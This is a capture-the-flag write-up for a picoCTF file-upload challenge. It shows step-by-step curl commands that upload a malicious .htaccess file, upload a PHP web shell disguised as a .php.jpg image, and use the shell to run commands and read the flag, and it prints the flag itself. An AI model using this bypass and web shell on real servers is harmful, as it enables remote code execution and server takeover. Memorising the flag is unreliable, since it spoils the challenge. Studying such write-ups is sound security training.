# byp4ss3d

## Category
Web Exploitation

## Difficulty
Medium

## Description
File upload challenge needing multiple bypasses to get RCE.

## What is that
Upload endpoint at `/upload.php` with restrictions:
- Only "image" files allowed
- Content-Type checked
- File extension filtering

## What fucked up
1. It accepted any MIME type starting with `image/`
2. `.php.jpg` worked
3. It allowed `.htaccess` files upload

## Exploit

**Upload Malicious .htaccess**
```bash
echo 'AddType application/x-httpd-php .jpg' > /tmp/.htaccess
curl -s -X POST <your url>/upload.php \
  -F "image=@/tmp/.htaccess;type=image/jpeg"
```

Here, Apache treat `.jpg` files as PHP.

**Upload PHP Shell**
```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php.jpg
curl -s -X POST <your url>/upload.php \
  -F "image=@/tmp/shell.php.jpg;type=image/jpeg"
```

The `.php.jpg` passed the image check (ends in `.jpg`), but executed as PHP thanks to the `.htaccess`.

**Get Flag**
```bash
curl <your url>/images/shell.php.jpg?cmd=cat /var/www/flag.txt #or visit that in your browser
```

## Flag
```
picoCTF{s3rv3r_byp4ss_e46b22e5}
```